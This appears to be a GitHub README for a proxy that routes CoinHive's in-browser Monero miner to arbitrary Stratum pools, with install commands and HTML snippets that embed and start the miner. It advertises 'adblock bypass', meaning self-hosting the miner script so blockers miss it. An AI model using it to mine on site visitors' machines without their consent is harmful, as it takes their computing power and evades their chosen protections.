# CoinHive Stratum Mining Proxy

A proof of concept of web mining using CoinHive's [JavaScript Mining](https://coinhive.com/documentation/miner) library. The proxy acts like coin hive to connect to a mining pool. Should work with any monero pool based on the [Stratum Mining Protocol](https://en.bitcoin.it/wiki/Stratum_mining_protocol). You can even set up your [own pool](https://github.com/sammy007/monero-stratum).

Pros: no dev fee, adblock bypass, use any pool you like.

## Installation

Run on Docker:

```sh
$ git clone https://github.com/x25/coinhive-stratum-mining-proxy.git
$ cd coinhive-stratum-mining-proxy
$ docker build -t coinhive-stratum-mining-proxy .
$ docker run -p 8892:8892 coinhive-stratum-mining-proxy <stratum tcp host> <stratum tcp port>
```

eg:

```sh
$ docker run -p 8892:8892 coinhive-stratum-mining-proxy xmr-us-east1.nanopool.org 14444
```
Or install dependencies (```apt-get install ...``` or ```brew install ...```):

- python
- python-dev
- pip
- openssl-dev
- gcc
- git
- musl-dev
- libffi-dev

and run on Linux/Mac box:

```sh
$ git clone https://github.com/x25/coinhive-stratum-mining-proxy.git
$ cd coinhive-stratum-mining-proxy
$ pip install -v -r requirements.txt
$ python coinhive-stratum-mining-proxy.py <stratum tcp host> <stratum tcp port>
```

eg:

```sh
$ python coinhive-stratum-mining-proxy.py xmr-eu1.nanopool.org 14444
```

## Usage

1. Install and Run `coinhive-stratum-mining-proxy`
2. Load the Coinhive Miner

```html
<script src="https://coinhive.com/lib/coinhive.min.js"></script>
```

The javascript can be saved/renamed and loaded from your server, see [adblock_bypass.html](https://github.com/x25/coinhive-stratum-mining-proxy/blob/master/static/adblock_bypass.html).

3. Change the ```CoinHive.CONFIG.WEBSOCKET_SHARDS``` config variable:

```html
<script>
CoinHive.CONFIG.WEBSOCKET_SHARDS = [["ws://localhost:8892/proxy"]];
</script>
```

4. Start Mining

```html
<script>
var miner = new CoinHive.Anonymous('YOUR_MONERO_ADDRESS');
miner.start();
</script>
```
or

```html
<script>
var miner = new CoinHive.User('YOUR_MONERO_ADDRESS', 'YOUR_WORKER_NAME');
miner.start();
</script>
```
the username will be used as the stratum worker name (use only if your pool supports worker names).

5. Profit!

## SSL/Secure WebSockets

Generate keypair:

```sh
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 100 -nodes
```

Run script with ```--ssl=key.pem:cert.pem``` parameter:

```sh
python coinhive-stratum-mining-proxy.py <stratum tcp host> <stratum tcp port> --ssl=key.pem:cert.pem
```

## Statistic

Simple stats are available at ```/stats``` route:

```sh
curl http://localhost:8892/stats?password=YOUR_PASS
{"total_hashes": 0, "uptime": 15.53, "clients": 1}
```

No password by default, please run with ``--password=YOUR_PASS`` argument to setup password.

## Demo

Setup and run `coinhive-stratum-mining-proxy` with `xmr-eu1.nanopool.org 14444` parameters and open http://localhost:8892 in your browser for live demo.

## Links

- [JavaScript Miner API](https://coinhive.com/documentation/miner)
- [Solo mining stratum pool for Monero](https://github.com/sammy007/monero-stratum)

## Disclaimer

This project is not endorsed by or affiliated with coinhive.com in any way.

## License

MIT
